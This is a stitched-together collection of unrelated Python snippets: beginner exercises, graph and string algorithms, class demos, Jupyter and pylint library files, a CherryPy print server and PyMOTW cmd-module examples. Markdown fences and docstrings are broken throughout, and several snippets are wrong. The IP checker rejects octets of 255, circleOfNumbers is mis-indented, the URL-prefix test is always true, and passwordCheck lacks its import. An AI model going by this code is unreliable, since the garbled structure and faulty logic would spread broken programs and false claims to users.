def change_brightness(img: Image, level: float) -> Image:
    """
    Change the brightness of a PIL Image to a given level.
    """

    def brightness(c: int) -> float:
        """
        Fundamental Transformation/Operation that'll be performed on
        every bit.
        """
        return 128 + level + (c - 128)

    if not -255.0 <= level <= 255.0:
        raise ValueError("level must be between -255.0 (black) and 255.0 (white)")
    return img.point(brightness)


if __name__ == "__main__":
    # Load image
    with Image.open("image_data/lena.jpg") as img:
        # Change brightness to 100
        brigt_img = change_brightness(img, 100)
        brigt_img.save("image_data/lena_brightness.png", format="png")
````

````py
Changing contrast with PIL

This algorithm is used in
https://noivce.pythonanywhere.com/ Python web app.

python/black: True
flake8 : True```


```py

from PIL import Image


def change_contrast(img: Image, level: int) -> Image:
    """
    Function to change contrast
    """
    factor = (259 * (level + 255)) / (255 * (259 - level))

    def contrast(c: int) -> int:
        """
        Fundamental Transformation/Operation that'll be performed on
        every bit.
        """
        return int(128 + factor * (c - 128))

    return img.point(contrast)


if __name__ == "__main__":
    # Load image
    with Image.open("image_data/lena.jpg") as img:
        # Change contrast to 170
        cont_img = change_contrast(img, 170)
        cont_img.save("image_data/lena_high_contrast.png", format="png")
````

````pyAbstract base classes for kernel client channels"""
# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.
import abc


class ChannelABC(object, metaclass=abc.ABCMeta):
    """A base class for all channel ABCs."""

    @abc.abstractmethod
    def start(self):
        pass

    @abc.abstractmethod
    def stop(self):
        pass

    @abc.abstractmethod
    def is_alive(self):
        pass


class HBChannelABC(ChannelABC):
    """HBChannel ABC.

    The docstrings for this class can be found in the base implementation:

    `jupyter_client.channels.HBChannel`
    """

    @abc.abstractproperty
    def time_to_dead(self):
        pass

    @abc.abstractmethod
    def pause(self):
        pass

    @abc.abstractmethod
    def unpause(self):
        pass

    @abc.abstractmethod
    def is_beating(self):
        pass

# A simple program illustrating chaotic behaviour


def main():
    print("This program illustrates a chaotic function")

    while True:
        try:
            x = float((input("Enter a number between 0 and 1: ")))
            if 0 < x and x < 1:
                break
            else:
                print("Please enter correct number")
        except Exception as e:
            print("Please enter correct number")

    for i in range(10):
        x = 3.9 * x * (1 - x)
        print(x)


if __name__ == "__main__":
    main()

# A simple and interactive chatBot


def greet(bot_name, birth_year):
    print("Hello! My name is " + bot_name + ".")
    print("I am your an interactive chat bot!")
    print("I was created in " + birth_year + ".")


def remind_name():
    print("Please, remind me your name.")
    name = input()
    print("What a great name you have, " + name + "!")


def guess_age():
    print("Let me guess your age.")
    print("Enter remainders of dividing your age by 3, 5 and 7.")

    rem3 = int(input())
    rem5 = int(input())
    rem7 = int(input())
    age = (rem3 * 70 + rem5 * 21 + rem7 * 15) % 105

    print("Your age is " + str(age) + "; that's a good time to start programming!")


def count():
    print("Now I will prove to you that I can count to any number you want.")

    num = int(input())
    curr = 0
    while curr <= num:
        print(curr)
        curr = curr + 1


def test():
    print("Let's test your programming knowledge.")
    print("Why do we use methods?")
    print("1. To repeat a statement multiple times.")
    print("2. To decompose a program into several small subroutines.")
    print("3. To determine the execution time of a program.")
    print("4. To interrupt the execution of a program.")
    answer = int(input())
    while answer != 3:
        print("Please, try again.")
        answer = int(input())
    print("Completed, have a nice day!")


def end():
    print("Congratulations, have a nice day!")


greet("Aid", "2021")  # change it as you need
remind_name()
guess_age()
count()
test()
end()

# def passwordCheck(s):
#    if any(i.isdigit() for i in s) and any(i.islower() for i in s) and any(i.isupper() for i in s) and len(s) >= 5:
#        return True
#    else:
#        return False

# passwordCheck = lambda s: (any(i.isdigit()) and any(i.islower()) and any(i.isupper())) for i in s and len(s) > 4

# Regex:

# def passwordCheck(s):
#    return len(s) > 4 and all(re.search(p, s) for p in ('[A-Z]', '\d', '[a-z]'))

passwordCheck = lambda s: len(s) > 4 and all(
    re.search(i, s) for i in ("[A-Z]", "\d", "[a-z]")
)

#! /usr/bin/env python3
# -*- coding: utf-8; mode: python -*-```


```py Check if an IBAN is correct.

Reference:
https://fr.wikipedia.org/wiki/International_Bank_Account_Number#Algorithme_de_v.C3.A9rification_de_l.27IBAN


- *Date:* Wednesday 09 March 2016.
- *Author:* Lilian Besson, (C) 2015-16.
- *Licence:* MIT Licence (http://lbesson.mit-license.org).```


```py

# Python 2 compatibility if needed
from __future__ import print_function, division


def l_to_c(l):
    try:
        return str(int(l))
    except ValueError:
        return str(10 + ord(l.upper()) - ord("A"))


def check_iban(iban):
    print("\nChecking the IBAN number '%s'..." % iban)
    ib = iban.replace(" ", "")
    ib = ib[4:] + ib[:4]
    print("Of length", len(ib))
    i = int("".join(l_to_c(l) for l in ib))
    check = (i % 97) == 1
    if check:
        print("OK '%s' seems to be a valid IBAN number." % iban)
    else:
        print("[WARNING] NOT OK '%s' seems to NOT be a valid IBAN number!" % iban)
    return check


def main(args):
    try:
        if not args:
            check_iban("HAHA LOL YOU THOUGH I WILL LET A REAL IBAN IN MY SCRIPT")
        else:
            for iban in args:
                check_iban(iban)
        return 0
    except Exception as e:
        print(e)
        return 1


if __name__ == "__main__":
    from sys import argv, exit

    exit(main(argv[1:]))

# End of check_IBAN.py

num = float(input("Enter a number: "))
if num > 0:
    print("Positive number")
elif num == 0:
    print("Zero")
else:
    print("Negative number")
    num = float(input("Enter a number: "))
if num >= 0:
    if num == 0:
        print("Zero")
    else:
        print("Positive number")
else:
    print("Negative number")
````

````py
wiki: https://en.wikipedia.org/wiki/Anagram```


```py


def check_anagrams(first_str: str, second_str: str) -> bool:
    """
    Two strings are anagrams if they are made of the same letters
    arranged differently (ignoring the case).
    >>> check_anagrams('Silent', 'Listen')
    True
    >>> check_anagrams('This is a string', 'Is this a string')
    True
    >>> check_anagrams('This is    a      string', 'Is     this a string')
    True
    >>> check_anagrams('There', 'Their')
    False
    """
    return (
        "".join(sorted(first_str.lower())).strip()
        == "".join(sorted(second_str.lower())).strip()
    )


if __name__ == "__main__":
    from doctest import testmod

    testmod()
    input_A = input("Enter the first string ").strip()
    input_B = input("Enter the second string ").strip()

    status = check_anagrams(input_A, input_B)
    print(f"{input_A} and {input_B} are {'' if status else 'not '}anagrams.")
````

```py

Bipartite graph is a graph whose vertices can be divided into two disjoint and independent sets.
(https://en.wikipedia.org/wiki/Bipartite_graph)

Time complexity is O(|E|)
Space complexity is O(|V|)
```

```py


def check_bipartite(adj_list):

    V = len(adj_list)

    # Divide vertexes in the graph into set_type 1 and 2
    # Initialize all set_types as -1
    set_type = [-1 for v in range(V)]
    set_type[0] = 0

    q = [0]

    while q:
        v = q.pop(0)

        # If there is a self-loop, it cannot be bipartite
        if adj_list[v][v]:
            return False

        for u in range(V):
            if adj_list[v][u]:
                if set_type[u] == set_type[v]:
                    return False
                elif set_type[u] == -1:
                    # set type of u opposite of v
                    set_type[u] = 1 - set_type[v]
                    q.append(u)

    return True

# Check whether Graph is Bipartite or Not using BFS


# A Bipartite Graph is a graph whose vertices can be divided into two independent sets,
# U and V such that every edge (u, v) either connects a vertex from U to V or a vertex
# from V to U. In other words, for every edge (u, v), either u belongs to U and v to V,
# or u belongs to V and v to U. We can also say that there is no edge that connects
# vertices of same set.
def checkBipartite(graph):
    queue = []
    visited = [False] * len(graph)
    color = [-1] * len(graph)

    def bfs():
        while queue:
            u = queue.pop(0)
            visited[u] = True

            for neighbour in graph[u]:

                if neighbour == u:
                    return False

                if color[neighbour] == -1:
                    color[neighbour] = 1 - color[u]
                    queue.append(neighbour)

                elif color[neighbour] == color[u]:
                    return False

        return True

    for i in range(len(graph)):
        if not visited[i]:
            queue.append(i)
            color[i] = 0
            if bfs() is False:
                return False

    return True


if __name__ == "__main__":
    # Adjacency List of graph
    print(checkBipartite({0: [1, 3], 1: [0, 2], 2: [1, 3], 3: [0, 2]}))

# Check whether Graph is Bipartite or Not using DFS


# A Bipartite Graph is a graph whose vertices can be divided into two independent sets,
# U and V such that every edge (u, v) either connects a vertex from U to V or a vertex
# from V to U. In other words, for every edge (u, v), either u belongs to U and v to V,
# or u belongs to V and v to U. We can also say that there is no edge that connects
# vertices of same set.
def check_bipartite_dfs(graph):
    visited = [False] * len(graph)
    color = [-1] * len(graph)

    def dfs(v, c):
        visited[v] = True
        color[v] = c
        for u in graph[v]:
            if not visited[u]:
                dfs(u, 1 - c)

    for i in range(len(graph)):
        if not visited[i]:
            dfs(i, 0)

    for i in range(len(graph)):
        for j in graph[i]:
            if color[i] == color[j]:
                return False

    return True


# Adjacency list of graph
graph = {0: [1, 3], 1: [0, 2], 2: [1, 3], 3: [0, 2], 4: []}
print(check_bipartite_dfs(graph))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import struct

bmp_header = b"\x42\x4d\x38\x8c\x0a\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x80\x02\x00\x00\x68\x01\x00\x00\x01\x00\x18\x00"

print(struct.unpack("<ccIIIIIIHH", bmp_header))

from collections import defaultdict


class Graph:
    def __init__(self, v):
        self.v = v
        self.graph = defaultdict(list)

    def add_edge(self, u, v):
        self.graph[u].append(v)

    def dfs(self):
        visited = [False] * self.v
        self.dfs_util(0, visited)
        if visited == [True] * self.v:
            return True
        return False

    def dfs_util(self, i, visited):
        visited[i] = True
        for u in self.graph[i]:
            if not (visited[u]):
                self.dfs_util(u, visited)

    def reverse_graph(self):
        g = Graph(self.v)
        for i in range(len(self.graph)):
            for j in self.graph[i]:
                g.add_edge(j, i)
        return g

    def is_sc(self):
        if self.dfs():
            gr = self.reverse_graph()
            if gr.dfs():
                return True
        return False


g1 = Graph(5)
g1.add_edge(0, 1)
g1.add_edge(1, 2)
g1.add_edge(2, 3)
g1.add_edge(3, 0)
g1.add_edge(2, 4)
g1.add_edge(4, 2)
print("Yes") if g1.is_sc() else print("No")

g2 = Graph(4)
g2.add_edge(0, 1)
g2.add_edge(1, 2)
g2.add_edge(2, 3)
print("Yes") if g2.is_sc() else print("No")

# Copyright (c) 2014-2015 Bruno Daniel <bruno.daniel@blue-yonder.com>
# Copyright (c) 2015-2016, 2018, 2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2016 Ashley Whetter <ashley@awhetter.co.uk>
# Copyright (c) 2020 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import warnings

from pylint.extensions import docparams


def register(linter):
    """Required method to auto register this checker.

    :param linter: Main interface object for Pylint plugins
    :type linter: Pylint object
    """
    warnings.warn(
        "This plugin is deprecated, use pylint.extensions.docparams instead.",
        DeprecationWarning,
    )
    linter.register_checker(docparams.DocstringParameterChecker(linter))

from linked_list import LinkedList


def check_for_cycle(ll):
    pass


# Tests
ll = LinkedList()

print(check_for_cycle(ll))
# should print False

ll.add_to_tail(1)

print(check_for_cycle(ll))
# should print False

ll.add_to_tail(2)
ll.add_to_tail(3)
ll.add_to_tail(4)

print(check_for_cycle(ll))
# should print False

ll.tail.next = ll.head.next.next

print(check_for_cycle(ll))
# should print True

# Script Name : check_for_sqlite_files.py
# Author  : Craig Richards
# Created  : 07 June 2013
# Last Modified : 14 February 2016
# Version  : 1.0.1

# Modifications : 1.0.1 - Remove unecessary line and variable on Line 21

# Description : Scans directories to check if there are any sqlite files in there

from __future__ import print_function

import os


def isSQLite3(filename):
    from os.path import isfile, getsize

    if not isfile(filename):
        return False
    if getsize(filename) < 100:  # SQLite database file header is 100 bytes
        return False
    else:
        fd = open(filename, "rb")
        header = fd.read(100)
        fd.close()

        if header[0:16] == "SQLite format 3\000":
            return True
        else:
            return False


log = open("sqlite_audit.txt", "w")
for r, d, f in os.walk(r"."):
    for files in f:
        if isSQLite3(files):
            print(files)
            print(
                "[+] '%s' **** is a SQLITE database file **** " % os.path.join(r, files)
            )
            log.write("[+] '%s' **** is a SQLITE database file **** " % files + "\n")
        else:
            log.write(
                "[-] '%s' is NOT a sqlite database file" % os.path.join(r, files) + "\n"
            )
            log.write("[-] '%s' is NOT a sqlite database file" % files + "\n")

def get_user_input(start, end):
    """
        input: two integer values
               lower limit 'start' and maximum 'end'
               the arguments aren't inclusive.

        output: if reading successful then returns the read integer.

        purpose: reads from command-line a integer in the given bounds.
                 while input invalid asks user again
    """

    loop = True  # controls while-loop

    while loop:

        try:

            # reads and converts the input from the console.
            user_input = int(input("Enter Your choice: "))

            # checks whether input is in the given bounds.
            if user_input > end or user_input < start:

                # error case
                print("Please try again. Not in valid bounds.")

            else:

                # valid case
                loop = False  # aborts while-loop

        except ValueError:

            # error case
            print("Please try again. Only numbers")

    return user_input


x = get_user_input(1, 6)
print(x)
# Asks user to enter something, ie. a number option from a menu.
# While type != interger, and not in the given range,
# Program gives error message and asks for new input.

from sys import argv

try:
    # For Python 3.0 and later
    from urllib.error import URLError
    from urllib.request import urlopen
except ImportError:
    # Fall back to Python 2's urllib2
    from urllib2 import URLError, urlopen


def checkInternetConnectivity():
    try:
        url = argv[1]
        if "https://" or "http://" not in url:
            url = "https://" + url
    except:
        url = "https://google.com"
    try:
        urlopen(url, timeout=2)
        print('Connection to "' + url + '" is working')

    except URLError as E:
        print("Connection error:%s" % E.reason)


checkInternetConnectivity()

def checkPalindrome(inputString):
    for i in range(len(inputString) // 2):
        if inputString[i] != inputString[len(inputString) - 1 - i]:
            return False
    return True
```

````py
Algorithm that checks if a given string is a pangram or not```


```py


def check_pangram(input_string):
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    for ch in alphabet:
        if ch not in input_string.lower():
            return False
    return True
````

````py
Checking valid Ip Address.
A valid IP address must be in the form of A.B.C.D,
where A,B,C and D are numbers from 0-254
for example: 192.168.23.1, 172.254.254.254 are valid IP address
             192.168.255.0, 255.192.3.121 are Invalid IP address```


```py


def check_valid_ip(ip: str) -> bool:
    """
    print "Valid IP address" If IP is valid.
    or
    print "Invalid IP address" If IP is Invalid.

    >>> check_valid_ip("192.168.0.23")
    True

    >>> check_valid_ip("192.255.15.8")
    False

    >>> check_valid_ip("172.100.0.8")
    True

    >>> check_valid_ip("254.255.0.255")
    False
    """
    ip1 = ip.replace(".", " ")
    list1 = [int(i) for i in ip1.split() if i.isdigit()]
    count = 0
    for i in list1:
        if i > 254:
            count += 1
            break
    if count:
        return False
    return True


if __name__ == "__main__":
    ip = input()
    output = check_valid_ip(ip)
    if output is True:
        print(f"{ip} is a Valid IP address")
    else:
        print(f"{ip} is an Invalid IP address")

def palindrome(a):

    mid = (len(a) - 1) // 2
    start = 0
    last = len(a) - 1
    flag = 0

    while start < mid:

        if a[start] == a[last]:

            start += 1
            last -= 1

        else:
            flag = 1
            break

    if flag == 0:
        print("The entered string is palindrome")
    else:
        print("The entered string is not palindrome")


def symmetry(a):

    n = len(a)
    flag = 0

    if n % 2:
        mid = n // 2 + 1
    else:
        mid = n // 2

    start1 = 0
    start2 = mid

    while start1 < mid and start2 < n:

        if a[start1] == a[start2]:
            start1 = start1 + 1
            start2 = start2 + 1
        else:
            flag = 1
            break

    if flag == 0:
        print("The entered string is symmetrical")
    else:
        print("The entered string is not symmetrical")


string = "amaama"
palindrome(string)
symmetry(string)
````

````py
Contains CheesePreprocessor```


```py
# -----------------------------------------------------------------------------
# Copyright (c) 2013, the IPython Development Team.
#
# Distributed under the terms of the Modified BSD License.
#
# The full license is in the file COPYING.txt, distributed with this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

from ...preprocessors.base import Preprocessor

# -----------------------------------------------------------------------------
# Classes
# -----------------------------------------------------------------------------


class CheesePreprocessor(Preprocessor):
    """
    Adds a cheese tag to the resources object
    """

    def __init__(self, **kw):
        """
        Public constructor
        """
        super().__init__(**kw)

    def preprocess(self, nb, resources):
        """
        Sphinx preprocessing to apply on each notebook.

        Parameters
        ----------
        nb : NotebookNode
            Notebook being converted
        resources : dictionary
            Additional resources used in the conversion process.  Allows
            preprocessors to pass variables into the Jinja engine.
        """
        resources["cheese"] = "real"
        return nb, resources

#!/usr/bin/env python3```


```py
http://cedeela.fr/~simon/files/print.py```


```py

import cherrypy
import cups
import uuid
import tempfile

HTML_TEMPLATE = """
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><title>Print</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head><body><h1>Print File</h1>
<form action="send" method="POST" enctype="multipart/form-data">
File name: <input name="file" type="file"><br>
User name: <input name="user"><br>
<input name="submit" type="submit">
</form>
</body>
</html>"""


class Print(object):
    @cherrypy.expose
    def index(self):
        return HTML_TEMPLATE

    @cherrypy.expose
    def send(self, file, user, **kwargs):
        try:
            cups.setUser(user)
            conn = cups.Connection()
            job_name = str(uuid.uuid4())
            content = file.file.read()
            with tempfile.NamedTemporaryFile(prefix="tmp_print") as f:
                f.write(content)
                f.flush()
                id = conn.printFile("MFP", f.name, job_name, {})
            msg = "success, job id: {}, job name: {}".format(id, job_name)
        except cups.IPPError as ex:
            status, description = ex
            msg = "IPP status is {}, meaning: {}".format(status, description)
        return msg


cherrypy.config.update({"server.socket_host": "0.0.0.0", "server.socket_port": 9999})
cherrypy.quickstart(Print())

def chessBoardCellColor(cell1, cell2):
    mydict = {"A": 1, "B": 2, "C": 3, "D": 4, "E": 5, "F": 6, "G": 7, "H": 8}
    if (mydict[cell1[0]] + int(cell1[1])) % 2 == (mydict[cell2[0]] + int(cell2[1])) % 2:
        return True
    else:
        return False
````

`pyChess Knight`

```py


def chessKnight(cell):
    valid_count = 0

    # All possible moves for knight
    dirs = [(-2, -1), (-2, 1), (-1, -2), (-1, 2), (1, -2), (1, 2), (2, -1), (2, 1)]

    # For each move of knight, check if it's valid
    for x, y in dirs:
        if (97 <= ord(cell[0]) + x <= 104) and (1 <= int(cell[1]) + y <= 8):
            valid_count += 1
    return valid_count
```

```py
Author Anurag Kumar(mailto:anuragkumarak95@gmail.com)

Module to solve a classic ancient Chinese puzzle:
We count 35 heads and 94 legs among the chickens and rabbits in a farm.
How many rabbits and how many chickens do we have?
```

````py


def solve(num_heads, num_legs):
    ns = "No solutions!"
    for i in range(num_heads + 1):
        j = num_heads - i
        if 2 * i + 4 * j == num_legs:
            return i, j
    return ns, ns


if __name__ == "__main__":
    numheads = 35
    numlegs = 94

    solutions = solve(numheads, numlegs)
    print(solutions)

def circleOfNumbers(n, firstNumber):
 """
 Return number that is radially opposite firstNumber
 in circle from 1 to n
 """
    return (firstNumber + (n / 2)) % n
#!/bin/python3

import math
import os
import random
import re
import sys


#
# Complete the 'getTime' function below.
#
# The function is expected to return a LONG_INTEGER.
# The function accepts STRING s as parameter.
#
import string
from collections import OrderedDict


def getTime(s):
    # Write your code here
    d = dict(zip(string.ascii_uppercase, range(0, 26)))
    dist = min(abs(d["A"] - d[s[0]]), 26 - abs(d["A"] - d[s[0]]))
    for i in range(1, len(s)):
        if abs(d[s[i]] - d[s[i - 1]]) > 13:
            dist += 26 - abs(d[s[i]] - d[s[i - 1]])
            print(dist)
        else:
            dist += abs(d[s[i]] - d[s[i - 1]])
            print(dist)
    return dist


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    s = input()

    result = getTime(s)

    fptr.write(str(result) + "\n")

    fptr.close()

class Animal:
    def __init__(self, kind, color, name):
        # constructor method/a new instance of animal
        # slef is like this from JS
        self.kind = kind
        self.name = name
        self.color = color

    def description(self):
        print("%s is a %s with color %s" % (self.name, self.kind, self.color))
        # or f"{self.name} is a {self.kind} with a color {self.color}"


cat = Animal("cat", "orange", "CAty")
dog = Animal("dog", "black", "HIM")

print(cat.kind)
print(dog.color)
cat.description()

class Animal:
    def __init__(self, species, name, legs, color, voices):
        self.species = species
        self.name = name
        self.legs = legs
        self.color = color
        self.voices = voices


cat = Animal("Cat", "Pussy-Cat", 4, "white", "meow")
dog = Animal("Dog", "Cloudy", 4, "brownie", "bark")

print("Species of animal : ", dog.species)
print("name of animal : ", dog.name)
print("no. of legs       : ", dog.legs)
print("color of animal : ", dog.color)
print("voice of animal : ", dog.voices)
print("  ")
print("Species of animal : ", cat.species)
print("name of animal : ", cat.name)
print("no. of legs        : ", cat.legs)
print("color of animal : ", cat.color)
print("voice of animal : ", cat.voices)

class movie:
    def __init__(self, name, rating, director, budget, description):
        self.name = name
        self.rating = rating
        self.director = director
        self.budget = budget
        self.description = description

    def good_movie(self):
        if self.rating >= 4:
            return "It's a good movie."


toy_story = movie(
    "ToyStory2",
    4,
    "John Lasseter , Lee Unkrich , Ash Brannon",
    "90 millon USD",
    """When Woody is toy-napped by a greedy toy collector and is nowhere to be found, Buzz and his friends set out to rescue him.But Woody too is tempted by the idea of becoming immortal in a museum.```


```py,
)

print("Title : " + str(toy_story.name))
print("Rating : " + str(toy_story.rating))
print("Director : " + str(toy_story.director))
print("Budget : " + str(toy_story.budget) + "\n")
print("Description :  " + str(toy_story.description))
print(toy_story.good_movie())

class Movie:
    def __init__(self, name, rating, director, budget, description):
        self.name = name
        self.rating = rating
        self.director = director
        self.budget = budget
        self.description = description

    def good_movie(self):
        if self.rating >= 4:
            return "Good Movie"
        else:
            return "Average Movie"


toy_story = Movie(
    "ToyStory2",
    4,
    "John Lasseter , Lee Unkrich , Ash Brannon",
    "90 millon USD",
    "When Woody is toy-napped by a greedy toy collector and is nowhere to be found, \nBuzz and his friends set out to rescue him.\nBut Woody too is tempted by the idea of becoming immortal in a museum.",
)

print("Title : " + toy_story.name)
print("Rating : " + str(toy_story.rating))
print("Director : " + toy_story.director)
print("Budget : " + str(toy_story.budget))
print("Description :  " + toy_story.description)
print("Comment: " + toy_story.good_movie())

from PIL import Image, ImageFilter

path = input("Enter the path where the image is located:")

img = Image.open(path)

img = img.filter(ImageFilter.BoxBlur(8))

img.save("blurredimage.jpg")
img.show()
````

```pyModule containing a preprocessor that removes the outputs from code cells"""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

from traitlets import Set
from .base import Preprocessor


class ClearOutputPreprocessor(Preprocessor):
    """
    Removes the output from all code cells in a notebook.
    """

    remove_metadata_fields = Set({"collapsed", "scrolled"}).tag(config=True)

    def preprocess_cell(self, cell, resources, cell_index):
        """
        Apply a transformation on each cell. See base.py for details.
        """
        if cell.cell_type == "code":
            cell.outputs = []
            cell.execution_count = None
            # Remove metadata associated with output
            if "metadata" in cell:
                for field in self.remove_metadata_fields:
                    cell.metadata.pop(field, None)
        return cell, resources
```

```pyCommand-line implementation of flake8."""
import sys
from typing import List, Optional

from flake8.main import application


def main(argv=None):
    # type: (Optional[List[str]]) -> None
    """Execute the main bit of the application.

    This handles the creation of an instance of :class:`Application`, runs it,
    and then exits the application.

    :param list argv:
        The arguments to be passed to the application for parsing.
    """
    if argv is None:
        argv = sys.argv[1:]

    app = application.Application()
    app.run(argv)
    app.exit()

from __future__ import absolute_import

import click
from click import *  # noqa

click.disable_unicode_literals_warning = True

# client.py

import socket

HOST, PORT = "127.0.0.1", 1400

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send(b"Hello World")
data = s.recv(1024)

s.close()
print(repr(data.decode("ascii")))
```

````py
Climbing Staircase

There exists a staircase with N steps, and you can climb up either X different steps at a time.
Given N, write a function that returns the number of unique ways you can climb the staircase.
The order of the steps matters.

Input: steps = [1, 2], height = 4
Output: 5
Output explanation:
1, 1, 1, 1
2, 1, 1
1, 2, 1
1, 1, 2
2, 2

=========================================
Dynamic Programing solution.
    Time Complexity:    O(N*S)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def climbing_staircase(steps, height):
    dp = [0 for i in range(height)]

    # add all steps into dp
    for s in steps:
        if s <= height:
            dp[s - 1] = 1

    # for each position look how you can arrive there
    for i in range(height):
        for s in steps:
            if i - s >= 0:
                dp[i] += dp[i - s]

    return dp[height - 1]


###########
# Testing #
###########

# Test 1
# Correct result => 5
print(climbing_staircase([1, 2], 4))

# Test 2
# Correct result => 3
print(climbing_staircase([1, 3, 5], 4))

# You are climbing a stair case. It takes n steps to reach to the top.
#
# Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?
#
# Note: Given n will be a positive integer.
#
# Example 1:
#
# Input: 2
# Output: 2
# Explanation: There are two ways to climb to the top.
# 1. 1 step + 1 step
# 2. 2 steps
# Example 2:
#
# Input: 3
# Output: 3
# Explanation: There are three ways to climb to the top.
# 1. 1 step + 1 step + 1 step
# 2. 1 step + 2 steps
# 3. 2 steps + 1 step


class Solution:
    def climbStairs(self, n):

        if n == 1:
            return 1

        first = 1
        second = 2

        for i in range(3, n + 1):
            third = first + second
            first = second
            second = third

        return second

import tkinter

# retrieve system's time
from time import strftime

# ------------------main code-----------------------
# initializing the main UI object
top = tkinter.Tk()
# setting title of the App
top.title("Clock")
# restricting the resizable property
top.resizable(0, 0)


def time():
    string = strftime("%H:%M:%S %p")
    clockTime.config(text=string)
    clockTime.after(1000, time)


clockTime = tkinter.Label(
    top, font=("calibri", 40, "bold"), background="black", foreground="white"
)

clockTime.pack(anchor="center")
time()


top.mainloop()

# Python program to copy or clone a list
# Using the Slice Operator
def Cloning(li1):
    li_copy = li1[:]
    return li_copy


# Driver Code
li1 = [4, 8, 2, 10, 15, 18]
li2 = Cloning(li1)
print("Original List:", li1)
print("After Cloning:", li2)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio

from pyppeteer import launch


async def main() -> None:
    browser = await launch(args=["--no-sandbox"])
    print(browser.wsEndpoint, flush=True)


asyncio.get_event_loop().run_until_complete(main())

```









---


```py



# end_pymotw_header
# Set up gnureadline as readline if installed.
try:
    import gnureadline
    import sys

    sys.modules["readline"] = gnureadline
except ImportError:
    pass

import cmd


class HelloWorld(cmd.Cmd):

    FRIENDS = ["Alice", "Adam", "Barbara", "Bob"]

    def do_greet(self, person):
        "Greet the person"
        if person and person in self.FRIENDS:
            greeting = "hi, {}!".format(person)
        elif person:
            greeting = "hello, {}".format(person)
        else:
            greeting = "hello"
        print(greeting)

    def complete_greet(self, text, line, begidx, endidx):
        if not text:
            completions = self.FRIENDS[:]
        else:
            completions = [f for f in self.FRIENDS if f.startswith(text)]
        return completions

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    HelloWorld().cmdloop()

```









---


```py



# end_pymotw_header
import cmd


class HelloWorld(cmd.Cmd):
    def do_greet(self, person):
        """greet [person]
        Greet the named person"""
        if person:
            print("hi,", person)
        else:
            print("hi")

    def do_EOF(self, line):
        return True

    def postloop(self):
        print()


if __name__ == "__main__":
    HelloWorld().cmdloop()

```









---


```py



# end_pymotw_header
import cmd


class InteractiveOrCommandLine(cmd.Cmd):
    """Accepts commands via the normal interactive
    prompt or on the command line.
    """

    def do_greet(self, line):
        print("hello,", line)

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        InteractiveOrCommandLine().onecmd(" ".join(sys.argv[1:]))
    else:
        InteractiveOrCommandLine().cmdloop()

```









---


```py



# end_pymotw_header
import cmd


class HelloWorld(cmd.Cmd):

    prompt = "prompt: "
    intro = "Simple command processor example."

    doc_header = "doc_header"
    misc_header = "misc_header"
    undoc_header = "undoc_header"

    ruler = "-"

    def do_prompt(self, line):
        "Change the interactive prompt"
        self.prompt = line + ": "

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    HelloWorld().cmdloop()

```









---


```py



# end_pymotw_header
# Set up gnureadline as readline if installed.
try:
    import gnureadline
    import sys

    sys.modules["readline"] = gnureadline
except ImportError:
    pass

import cmd


class HelloWorld(cmd.Cmd):
    def do_greet(self, person):
        if person:
            print("hi,", person)
        else:
            print("hi")

    def help_greet(self):
        print("\n".join(["greet [person]", "Greet the named person"]))

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    HelloWorld().cmdloop()

```









---


```py



# end_pymotw_header
import cmd
import subprocess


class ShellEnabled(cmd.Cmd):

    last_output = ""

    def do_shell(self, line):
        "Run a shell command"
        print("running shell command:", line)
        sub_cmd = subprocess.Popen(line, shell=True, stdout=subprocess.PIPE)
        output = sub_cmd.communicate()[0].decode("utf-8")
        print(output)
        self.last_output = output

    def do_echo(self, line):
        """Print the input, replacing '$out' with
        the output of the last shell command.
        """
        # Obviously not robust
        print(line.replace("$out", self.last_output))

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    ShellEnabled().cmdloop()

```









---


```py



# end_pymotw_header
import cmd


class HelloWorld(cmd.Cmd):

    # Disable rawinput module use
    use_rawinput = False

    # Do not show a prompt after each command read
    prompt = ""

    def do_greet(self, line):
        print("hello,", line)

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    import sys

    with open(sys.argv[1], "rt") as input:
        HelloWorld(stdin=input).cmdloop()

```









---


```py



# end_pymotw_header
# Set up gnureadline as readline if installed.
try:
    import gnureadline
    import sys

    sys.modules["readline"] = gnureadline
except ImportError:
    pass

import cmd


class Illustrate(cmd.Cmd):
    "Illustrate the base class method use."

    def cmdloop(self, intro=None):
        print("cmdloop({})".format(intro))
        return cmd.Cmd.cmdloop(self, intro)

    def preloop(self):
        print("preloop()")

    def postloop(self):
        print("postloop()")

    def parseline(self, line):
        print("parseline({!r}) =>".format(line), end="")
        ret = cmd.Cmd.parseline(self, line)
        print(ret)
        return ret

    def onecmd(self, s):
        print("onecmd({})".format(s))
        return cmd.Cmd.onecmd(self, s)

    def emptyline(self):
        print("emptyline()")
        return cmd.Cmd.emptyline(self)

    def default(self, line):
        print("default({})".format(line))
        return cmd.Cmd.default(self, line)

    def precmd(self, line):
        print("precmd({})".format(line))
        return cmd.Cmd.precmd(self, line)

    def postcmd(self, stop, line):
